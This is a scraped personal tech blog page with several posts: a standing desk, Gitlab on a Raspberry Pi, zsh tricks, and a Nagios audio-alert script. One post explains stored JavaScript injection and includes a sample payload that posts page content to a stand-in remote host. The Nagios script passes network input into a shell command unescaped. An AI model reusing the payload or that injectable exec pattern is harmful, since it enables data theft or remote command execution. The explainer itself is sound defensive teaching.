<p>1 x Tertial Work lamp, <a href="http://www.ikea.com/us/en/catalog/products/20370383/" target="_blank" rel="external">http://www.ikea.com/us/en/catalog/products/20370383/</a>, $9</p>
<p>Total: $109+Tax</p>
<h2 id="Note">Note</h2>
<p>I didn’t do some serious hack to increase the height of the table legs like this guy did <a href="http://www.ikeahackers.net/2014/02/convert-the-finnvard-into-a-height-adjustable-standing-desk.html" target="_blank" rel="external">http://www.ikeahackers.net/2014/02/convert-the-finnvard-into-a-height-adjustable-standing-desk.html</a> because the legs are able to reach upto 36 5/8, with 1” for the table top, the final result is 37 5/8, which is pretty close to my ideal desk height (the height where elbows can rest on the table top).</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://midnightcodr.github.io/2014/03/23/i-just-built-my-first-standing-desk/" data-id="60himoimybm442ji" class="article-share-link">Share</a>
      
        <a href="http://midnightcodr.github.io/2014/03/23/i-just-built-my-first-standing-desk/#disqus_thread" class="article-comment-link">Comments</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-install-gitlab-6-dot-4-on-raspberry-pi" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2014/01/11/install-gitlab-6-dot-4-on-raspberry-pi/" class="article-date">
  <time datetime="2014-01-11T14:31:00.000Z" itemprop="datePublished">Jan 11 2014</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/gitlab/">gitlab</a>►<a class="article-category-link" href="/categories/gitlab/raspberrypi/">raspberrypi</a>►<a class="article-category-link" href="/categories/gitlab/raspberrypi/rpi/">rpi</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2014/01/11/install-gitlab-6-dot-4-on-raspberry-pi/">Install Gitlab(6.4) on Raspberry PI</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>I am a big fan of both Raspberry PI and Gitlab so it kinda bugs me when my attempts to install Gitlab onto RPI didn’t succeed because of failure to install therubyracer gem. Others experienced the similar problems I encountered: <a href="http://www.raspberrypi.org/phpBB3/viewtopic.php?t=32716&amp;p=397934" target="_blank" rel="external">http://www.raspberrypi.org/phpBB3/viewtopic.php?t=32716&amp;p=397934</a>, by following most of user dpenezic’s instruction I finally made it to install Gitlab (currently at version 6.4) onto my RPI (512MB Ram but only 384MB is available to the system as I allocate the rest to GPU). So here are what I did:</p>
<h2 id="Steps">Steps</h2>
<p>1) Follow <a href="https://github.com/gitlabhq/gitlabhq/blob/6-4-stable/doc/install/installation.md" target="_blank" rel="external">https://github.com/gitlabhq/gitlabhq/blob/6-4-stable/doc/install/installation.md</a> until “Install Gems”</p>
<p>2) Install libv8 (<a href="https://github.com/cowboyd/libv8" target="_blank" rel="external">https://github.com/cowboyd/libv8</a>)</p>
<pre><code><span class="comment"># [update: added git-svn to the list on 1/17/2014]</span>
<span class="built_in">sudo</span> apt-get install -y subversion git-svn
[ <span class="operator">-d</span> ~/tmp ] || mkdir ~/tmp
<span class="built_in">cd</span> ~/tmp
git clone https://github.com/cowboyd/libv8
<span class="built_in">cd</span> libv8
bundle install
<span class="comment"># be patient, the following command takes a while</span>
bundle <span class="keyword">exec</span> rake clean build binary
<span class="built_in">sudo</span> gem install pkg/libv8-<span class="number">3.11</span>.<span class="number">8.17</span>-armv6l-linux.gem
</code></pre><p>3) Modify /home/git/gitlab/Gemfile (and .lock) to skip installation of libv8 (as it’s installed through the above step) and the rubyracer</p>
<pre><code>cd /home/git/gitlab
sudo -u git -H editor <span class="type">Gemfile</span>    <span class="comment"># and remove the line: gem "therubyracer"</span>
sudo -u git -H editor <span class="type">Gemfile</span>.lock    <span class="comment"># and removed the following lines</span>
    libv8 (<span class="number">3</span>.<span class="number">16</span>.<span class="number">14</span>.<span class="number">3</span>)
    therubyracer (<span class="number">0</span>.<span class="number">12</span>.<span class="number">0</span>)
      libv8 (~&gt; <span class="number">3</span>.<span class="number">16</span>.<span class="number">14</span>.<span class="number">0</span>)
      <span class="keyword">ref</span>
</code></pre><p>4) Install node.js, you can take a look at the script I came up with to compile node.js in RPI: <a href="https://github.com/midnightcodr/rpi_node_install" target="_blank" rel="external">https://github.com/midnightcodr/rpi_node_install</a></p>
<p>5) Now you can resume the “Install Gems” step in the Gitlab installation guide</p>
<pre><code><span class="built_in">sudo</span> -u git -H bundle install --deployment --without development test postgres aws
<span class="comment"># and the rest</span>
</code></pre><h2 id="Notes">Notes</h2>
<p>1) 384MB is not enough to run “Compile assets” step on the gitlab installation guide so I had to add some more swap memory by following <a href="http://www.cyberciti.biz/faq/linux-add-a-swap-file-howto/" target="_blank" rel="external">http://www.cyberciti.biz/faq/linux-add-a-swap-file-howto/</a></p>
<pre><code><span class="built_in">sudo</span> dd <span class="keyword">if</span>=/dev/zero of=/swapfile1 bs=<span class="number">1024</span> count=<span class="number">524288</span>
<span class="built_in">sudo</span> mkswap /swapfile1
<span class="built_in">sudo</span> chmod <span class="number">0600</span> /swapfile1
<span class="built_in">sudo</span> swapon /swapfile1
</code></pre><p>2) Make sure the server_name setting in /etc/nginx/sites-available/gitlab matches gitlab_url in /home/git/gitlab-shell/config.yml, also add an entry to your RPI’s /etc/hosts</p>
<pre><code><span class="number">127.0</span>.<span class="number">0.1</span>    gitlab.server.<span class="built_in">hostname</span>
</code></pre><p>3) With the current version of Gitlab, performance is not that bad at all - it takes about 2 seconds to switch pages.</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://midnightcodr.github.io/2014/01/11/install-gitlab-6-dot-4-on-raspberry-pi/" data-id="1gaxa9feeo2tv2om" class="article-share-link">Share</a>
      
        <a href="http://midnightcodr.github.io/2014/01/11/install-gitlab-6-dot-4-on-raspberry-pi/#disqus_thread" class="article-comment-link">Comments</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-a-few-zsh-tricks" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2013/11/09/a-few-zsh-tricks/" class="article-date">
  <time datetime="2013-11-09T22:53:00.000Z" itemprop="datePublished">Nov 9 2013</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/shell/">shell</a>►<a class="article-category-link" href="/categories/shell/zsh/">zsh</a>►<a class="article-category-link" href="/categories/shell/zsh/command-line/">command-line</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2013/11/09/a-few-zsh-tricks/">A few zsh tricks</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>Here are a few zsh tricks that I learned (and enjoy using) recently:</p>
<h4 id="The_basics_-_use_!!_to_retrieve_last_command">The basics - use !! to retrieve last command</h4>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="function_or_atom">tail</span> /<span class="function_or_atom">var</span>/<span class="function_or_atom">log</span>/<span class="function_or_atom">message</span></div><div class="line"><span class="exclamation_mark">!</span><span class="exclamation_mark">!</span></div></pre></td></tr></table></figure>

<h4 id="The_not_so_basic_-_get_last_parameter_of_last_command_with_!$">The not so basic - get last parameter of last command with !$</h4>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">mkdir</span> new_folder</div><div class="line"><span class="keyword">cd</span> !$	# after this <span class="keyword">command</span> you will <span class="keyword">be</span> in folder new_folder</div></pre></td></tr></table></figure>

<h4 id="Get_all_parameters_from_the_last_command_with_!*">Get all parameters from the last command with !*</h4>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">diff src/file1 dest/</div><div class="line"><span class="keyword">cp</span> !*</div></pre></td></tr></table></figure>

<h4 id="The_pretty_awsome_-_substitution_with_!!:s/from/to_or_!!:gs/from/to">The pretty awsome - substitution with !!:s/<em>from</em>/<em>to</em> or !!:gs/<em>from</em>/<em>to</em></h4>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">vi src/en/file.txt</div><div class="line">!!<span class="symbol">:s/en/fr</span></div></pre></td></tr></table></figure>

<pre><code>diff src/en/file.txt dest/en/file.txt
!!<span class="symbol">:gs/en/fr</span>        <span class="comment"># g for global substitution</span>
</code></pre><h4 id="Even_better_with_^">Even better with ^</h4>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">vi src<span class="regexp">/en/</span><span class="keyword">file</span>.txt</div><div class="line">^en^fr</div><div class="line"></div><div class="line">diff src<span class="regexp">/en/</span><span class="keyword">file</span>.txt dest<span class="regexp">/en/</span><span class="keyword">file</span>.txt</div><div class="line">^en^fr^:G</div></pre></td></tr></table></figure>

<h4 id="Switching_between_directories_with_similar_structure_(added_Dec_7,_2013)">Switching between directories with similar structure (added Dec 7, 2013)</h4>
<p>let’s say you are in ~/dev/myproject1/src/lib/, and you want to cd to  ~/dev/myproject2/src/lib/, all you need to do is</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> myproject1 myproject2</div></pre></td></tr></table></figure>

<p>or even</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> <span class="number">1</span> <span class="number">2</span></div></pre></td></tr></table></figure>

<h4 id="Batch_renaming_with_zmv">Batch renaming with zmv</h4>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="title">autoload</span> zmv</div><div class="line">zmv <span class="string">'(*).txt'</span> <span class="string">'<span class="variable">$1</span>.dat'</span>	<span class="comment"># change *.txt to *.dat</span></div></pre></td></tr></table></figure>

<p>see more zmv examples at <a href="http://zshwiki.org/home/builtin/functions/zmv" target="_blank" rel="external">http://zshwiki.org/home/builtin/functions/zmv</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://midnightcodr.github.io/2013/11/09/a-few-zsh-tricks/" data-id="2df8j35yjv683fdc" class="article-share-link">Share</a>
      
        <a href="http://midnightcodr.github.io/2013/11/09/a-few-zsh-tricks/#disqus_thread" class="article-comment-link">Comments</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-use-and-and-in-to-simplify-codes" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2013/07/20/use-and-and-in-to-simplify-codes/" class="article-date">
  <time datetime="2013-07-20T06:46:00.000Z" itemprop="datePublished">Jul 20 2013</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/programming/">programming</a>►<a class="article-category-link" href="/categories/programming/javascript/">javascript</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2013/07/20/use-and-and-in-to-simplify-codes/">Use &amp;&amp; to simplify js codes</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="The_technique_will_be_illustrated_by_the_following_simple_js_codes:">The technique will be illustrated by the following simple js codes:</h2>
<figure class="highlight js"><figcaption><span>demo</span><a href="/downloads/code/js-reg-and.js">download</a></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> s=<span class="string">'data0'</span>, m=<span class="regexp">/^([a-z]+)(\d+)$/</span>.exec(s);</div><div class="line"></div><div class="line"><span class="comment">/* the most common (and obvious) way to </span></div><div class="line"> * check if there is match and the 2nd captured group's value is 0</div><div class="line"> * would be</div><div class="line">*/</div><div class="line"><span class="keyword">if</span>(m) {</div><div class="line">	<span class="keyword">if</span>( m[<span class="number">2</span>] === <span class="string">'0'</span> ) {</div><div class="line">		<span class="built_in">console</span>.log(<span class="string">'maybe'</span>);</div><div class="line">	}</div><div class="line">}</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">/* but the above code can be simplified to */</span></div><div class="line"></div><div class="line"><span class="keyword">if</span>( m &amp;&amp; m[<span class="number">2</span>] === <span class="string">'0'</span>) {</div><div class="line">	<span class="built_in">console</span>.log(<span class="string">'maybe'</span>);</div><div class="line">}</div><div class="line"></div><div class="line"><span class="comment">/* the technique can also be used in switch-case statement */</span></div><div class="line"> </div><div class="line"><span class="keyword">switch</span>( m &amp;&amp; m[<span class="number">2</span>] ) {</div><div class="line">	<span class="keyword">case</span> <span class="string">'1'</span>:</div><div class="line">		<span class="built_in">console</span>.log(<span class="string">'never'</span>);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	<span class="keyword">case</span> <span class="string">'0'</span>:</div><div class="line">		<span class="built_in">console</span>.log(<span class="string">'maybe'</span>);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	<span class="keyword">default</span>:</div><div class="line">		<span class="built_in">console</span>.log(<span class="string">'run out of options'</span>)</div><div class="line">}</div></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://midnightcodr.github.io/2013/07/20/use-and-and-in-to-simplify-codes/" data-id="zrxvffx49jltlhto" class="article-share-link">Share</a>
      
        <a href="http://midnightcodr.github.io/2013/07/20/use-and-and-in-to-simplify-codes/#disqus_thread" class="article-comment-link">Comments</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-javascript-injection-attack-what-is-it-and-how-to-prevent" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2013/06/15/javascript-injection-attack-what-is-it-and-how-to-prevent/" class="article-date">
  <time datetime="2013-06-16T00:46:00.000Z" itemprop="datePublished">Jun 15 2013</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/javascript/">javascript</a>►<a class="article-category-link" href="/categories/javascript/security/">security</a>►<a class="article-category-link" href="/categories/javascript/security/injection-attack/">injection attack</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2013/06/15/javascript-injection-attack-what-is-it-and-how-to-prevent/">Javascript injection attack - what is it and how to prevent</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>Yes we’ve heard of the term “Javascript injection” from time to time but have you ever wonder how it actually works? In this post I will use a very simple example to demostrate how a potential attacker can take advantage of this kind of vulnerability.</p>
<p>Let’s say we build a user forum which only registered user can view its content. One of the basic feature of a forum is to allow user to create new topics or reply to existing topics. In either case we need to create some html form to accept user inputs. We are very aware of MySQL injection so we use prepared statement to store topic content into the database. All is well but we</p>
<ul>
<li>forgot to sanitize the topic body (and/or other related fields such as subject) before storing to database</li>
<li>render content from database as is without using proper escaping. So if an attacker enters the following content into the topic body:</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Hello there.</div><div class="line"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">type</span>=<span class="value">"text/javascript"</span>&gt;</span><span class="javascript"></span></div><div class="line">	<span class="keyword">var</span> _info=$(<span class="string">'body'</span>).html();</div><div class="line">	$.post(<span class="string">'http://some.remote.host/'</span>,{data:_info});</div><div class="line"><span class="tag">&lt;/<span class="title">script</span>&gt;</span></div></pre></td></tr></table></figure>

<p>When the topic gets rendered in a normal user’s browser, user will see “Hello there” in the topic content. Under the hood the page’s html source code (which might contains some information only the user should  have access to) will be sent to a remote host that the attacker has access to without user’s awareness as the js code is not rendered (but it does get executed in user’s browser). If $(‘body’) contains too much info, the attacker can choose to steal information specific element (or elements).</p>
<p>To prevent this kind of attack, we need to either:<br>Properly escape content from the server when rendering in the browser.<br>or<br>Strip tags such as <code>&lt;script&gt;</code>, or only allow tags such as p, br when storing user input into database.</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://midnightcodr.github.io/2013/06/15/javascript-injection-attack-what-is-it-and-how-to-prevent/" data-id="3n63z2yrryvyup38" class="article-share-link">Share</a>
      
        <a href="http://midnightcodr.github.io/2013/06/15/javascript-injection-attack-what-is-it-and-how-to-prevent/#disqus_thread" class="article-comment-link">Comments</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-nagios-audio-alert-with-mac-os-x" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2013/05/09/nagios-audio-alert-with-mac-os-x/" class="article-date">
  <time datetime="2013-05-10T00:50:00.000Z" itemprop="datePublished">May 9 2013</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/howto/">howto</a>►<a class="article-category-link" href="/categories/howto/fun/">fun</a>►<a class="article-category-link" href="/categories/howto/fun/nagios/">nagios</a>►<a class="article-category-link" href="/categories/howto/fun/nagios/node-js/">node.js</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2013/05/09/nagios-audio-alert-with-mac-os-x/">Nagios audio alert with Mac OS X</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="Background">Background</h2>
<p>You have a nagios server running Linux and you have a nice OS at work called Mac OS X which comes with a handy text-to-speech feature. Wouldn’t it be nice if you can turn your workstation into a nagios audio alert system? In this post I’ll show you extactly how you can achieve that.</p>
<h2 id="Requirements">Requirements</h2>
<ul>
<li>node.js installed on the client, along with a module called execSync (installed by command <code>npm install -g execSync</code>)</li>
<li>nc (netcat) is installed on the nagios server (most distro comes with it so this shouldn’t be a problem)</li>
</ul>
<h2 id="Code_on_the_client">Code on the client</h2>
<figure class="highlight js"><figcaption><span>/usr/local/bin/nagios-audio-alert.js</span><a href="/downloads/code/nagios-audio-alert.js">download</a></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* /usr/local/bin/nagios-audio-alert.js */</span></div><div class="line"><span class="keyword">var</span> dgram = <span class="built_in">require</span>(<span class="string">'dgram'</span>)</div><div class="line">	, server = dgram.createSocket(<span class="string">'udp4'</span>)</div><div class="line">	, exec=<span class="built_in">require</span>(<span class="string">'execSync'</span>).exec</div><div class="line">	, server_port=<span class="number">20123</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">ts_log</span><span class="params">(_msg)</span> </span>{</div><div class="line">	<span class="built_in">console</span>.log(<span class="string">'[%s] %s'</span>, <span class="keyword">new</span> <span class="built_in">Date</span>().toString(), _msg);</div><div class="line">}</div><div class="line"></div><div class="line">server.on(<span class="string">"message"</span>, <span class="function"><span class="keyword">function</span> <span class="params">(msg, rinfo)</span> </span>{</div><div class="line">	<span class="keyword">var</span> pmsg=msg.toString().replace(<span class="regexp">/^\s+|\s+$/</span>, <span class="string">''</span>)</div><div class="line">	<span class="keyword">if</span>(pmsg===<span class="string">'X'</span>) { <span class="keyword">return</span>; }</div><div class="line">	<span class="keyword">if</span>(pmsg!==<span class="string">''</span>) {</div><div class="line">		ts_log(<span class="string">"server got: "</span> + msg + <span class="string">" from "</span> + rinfo.address + <span class="string">":"</span> + rinfo.port);</div><div class="line">		<span class="keyword">var</span> arr=pmsg.split(<span class="regexp">/::/</span>);</div><div class="line">		<span class="keyword">if</span>(arr.length&gt;<span class="number">2</span>) {</div><div class="line">			<span class="keyword">var</span> msg_target=arr[<span class="number">0</span>], msg_state=arr[<span class="number">1</span>], msg_body=arr[<span class="number">2</span>];</div><div class="line">			<span class="keyword">if</span>(msg_state===<span class="string">'PROBLEM'</span>) {</div><div class="line">				exec(<span class="string">'afplay /System/Library/Sounds/Glass.aiff'</span>)</div><div class="line">				exec(<span class="string">'afplay /System/Library/Sounds/Glass.aiff'</span>)</div><div class="line">				<span class="keyword">if</span>(msg_target===<span class="string">'host'</span>) {</div><div class="line">					exec(<span class="string">'say "Attention Please, host '</span>+msg_body+<span class="string">' is having a problem."'</span>);</div><div class="line">				} <span class="keyword">else</span> <span class="keyword">if</span> (msg_target===<span class="string">'service'</span>) {</div><div class="line">					exec(<span class="string">'say "May I have your attention please, service problem: '</span>+msg_body+ <span class="string">'"'</span>);</div><div class="line">				}</div><div class="line">			} <span class="keyword">else</span> {</div><div class="line">				ts_log(<span class="string">'Received a message regarding nagios alert'</span>+msg_body);</div><div class="line">			}</div><div class="line">		} <span class="keyword">else</span> {</div><div class="line">			ts_log(<span class="string">'Not a valid message ('</span>+pmsg+<span class="string">')'</span>);</div><div class="line">		}</div><div class="line">	} <span class="keyword">else</span> {</div><div class="line">		ts_log(<span class="string">'Blank or space only message received.'</span>);</div><div class="line">	}</div><div class="line">});</div><div class="line"></div><div class="line">server.on(<span class="string">"listening"</span>, <span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>{</div><div class="line">  <span class="keyword">var</span> address = server.address();</div><div class="line">  ts_log(<span class="string">"server listening "</span> + address.address + <span class="string">":"</span> + address.port);</div><div class="line">});</div><div class="line">server.bind(server_port);</div></pre></td></tr></table></figure><br>Run the code from terminal:<br><br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">node <span class="regexp">/usr/</span>local<span class="regexp">/bin/</span>nagios-audio-alert.js</div></pre></td></tr></table></figure>

<h2 id="Do_some_test_runs_on_the_client">Do some test runs on the client</h2>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="title">echo</span> <span class="string">"service::PROBLEM::service down test"</span>|nc -u -w <span class="number">1</span> <span class="number">127.0.0.1</span> <span class="number">20123</span></div><div class="line">echo <span class="string">"host::PROBLEM::host test123 is down"</span>|nc -u -w <span class="number">1</span> <span class="number">127.0.0.1</span> <span class="number">20123</span></div></pre></td></tr></table></figure>

<p>If everything goes well, ^C to exit the nagios-audio-alert.js program and move on to nagios server.</p>
<h2 id="Modification_to_nagios_server’s_config_files">Modification to nagios server’s config files</h2>
<ul>
<li>command.cfg</li>
</ul>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">...</span></div><div class="line">define command{</div><div class="line">	command_name    notify-host-by-tts</div><div class="line">	command_line /usr/bin/printf <span class="string">"host::$NOTIFICATIONTYPE$::$HOSTNAME$ is $HOSTSTATE$"</span>|nc -u -v -w <span class="number">1</span> &lt;replace_with_ip_of_mac_client&gt; <span class="number">20123</span></div><div class="line">}</div><div class="line"><span class="keyword">...</span></div></pre></td></tr></table></figure>

<ul>
<li>template.cfg</li>
</ul>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">...</span></div><div class="line">define contact{</div><div class="line">	name                            generic-contact         ; The name of this contact template</div><div class="line">	service_notification_period     24x7                    ; service notifications can be sent anytime</div><div class="line">	host_notification_period        24x7                    ; host notifications can be sent anytime</div><div class="line">	service_notification_options    u,c,r,f,s               ; send notifications <span class="keyword">for</span> all service states, flapping events, and scheduled downtime events</div><div class="line">	host_notification_options       d,u,r,f,s               ; send notifications <span class="keyword">for</span> all host states, flapping events, and scheduled downtime events</div><div class="line">	<span class="comment">#service_notification_commands   notify-service-by-email        ; send service notifications via email</span></div><div class="line">	service_notification_commands   notify-service-by-tts,notify-service-by-email	; notify thru audio & email</div><div class="line">	<span class="comment">#host_notification_commands      notify-host-by-email   ; send host notifications via email</span></div><div class="line">	host_notification_commands      notify-host-by-tts,notify-host-by-email</div><div class="line">	register                        <span class="number">0</span>                       ; DONT REGISTER THIS DEFINITION - ITS NOT A REAL CONTACT, JUST A TEMPLATE!</div><div class="line">}</div><div class="line"><span class="keyword">...</span></div></pre></td></tr></table></figure>

<ul>
<li>Restart nagios server after making the above changes, always test nagios configuration before restarting: <code>/etc/init.d/nagios checkconfig</code></li>
</ul>
<h2 id="Run_nagios-audio-server-js_as_a_daemon">Run nagios-audio-server.js as a daemon</h2>
<p>Rason for this is that we want the Mac to be able to play alerts even when the user is not logged in. Create <code>/System/Library/LaunchDaemons/nagios-audio-alert.plist</code> with the following content, change <code>CHANGE_TO_YOUR_USERNAME_ON_MAC</code> to your mac username</p>
<figure class="highlight xml"><figcaption><span>/System/Library/LaunchDaemons/nagios-audio-alert.plist</span><a href="/downloads/code/nagios-audio-alert.plist.xml">download</a></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="pi">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></div><div class="line"><span class="doctype">&lt;!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">plist</span> <span class="attribute">version</span>=<span class="value">"1.0"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">dict</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="title">key</span>&gt;</span>Label<span class="tag">&lt;/<span class="title">key</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="title">string</span>&gt;</span>nagios_alert<span class="tag">&lt;/<span class="title">string</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="title">key</span>&gt;</span>UserName<span class="tag">&lt;/<span class="title">key</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="title">string</span>&gt;</span>CHANGE_TO_YOUR_USERNAME_ON_MAC<span class="tag">&lt;/<span class="title">string</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="title">key</span>&gt;</span>ProgramArguments<span class="tag">&lt;/<span class="title">key</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="title">array</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="title">string</span>&gt;</span>/usr/local/bin/node<span class="tag">&lt;/<span class="title">string</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="title">string</span>&gt;</span>/usr/local/bin/nagios.js<span class="tag">&lt;/<span class="title">string</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="title">array</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="title">key</span>&gt;</span>StandardOutPath<span class="tag">&lt;/<span class="title">key</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="title">string</span>&gt;</span>/var/log/nagios_alert.log<span class="tag">&lt;/<span class="title">string</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="title">key</span>&gt;</span>KeepAlive<span class="tag">&lt;/<span class="title">key</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="title">true</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="title">dict</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="title">plist</span>&gt;</span></div></pre></td></tr></table></figure><br>then<br><br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo launchctl load -w <span class="regexp">/System/</span>Library<span class="regexp">/LaunchDaemons/</span>nagios-audio-alert.plist</div></pre></td></tr></table></figure>

<h2 id="Some_notes">Some notes</h2>
<ul>
<li>20123 is the UDP port I grabbed from the air, change to whatever port you like (make sure they are in sync in both the js code and nagios config file command.cfg</li>
<li>Reason why execSync is needed is because if you have two (or more) messages come in at the same time (or almost simultaneously), you want the messages to be played one after another</li>
<li>If you have filewall on either the client or the nagios server, make sure they allow the traffic for the protocol/port used</li>
<li>A mac client is not really a hard requirement to build a nagios audio alert system like this, a Linux box that is capable of doing text-to-audio can handle this kind of task with ease, some code in nagios-audio-alert.js need to be changed though</li>
</ul>

      
    </div>
    <footer class="article-footer">
